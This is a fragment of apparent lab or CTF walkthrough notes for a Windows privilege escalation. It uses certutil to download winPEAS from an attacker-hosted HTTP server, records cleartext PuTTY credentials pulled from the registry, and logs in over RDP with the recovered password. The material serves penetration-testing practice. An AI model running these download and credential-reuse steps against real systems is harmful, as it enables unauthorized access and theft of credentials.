...
# Host File via HTTP Server
python3 -m http.server 80

# Transfer with certutil
certutil -urlcache -f http://192.168.45.244/winPEASx64.exe C:\Users\Public\Documents\winPEASx64.exe

#Run it
winPEASx64.exe

# Found cleartext creds
Putty Sessions
    RegKey Name: zachary
...
## RDP in as administrator Zachary
```bash
xfreerdp3 /v:192.168.165.145 /u:zachary /p:'Th3R@tC@tch3r' /cert:ignore +clipboard +fonts +compression /dynamic-resolution /drive:tools,/home/kali/tools
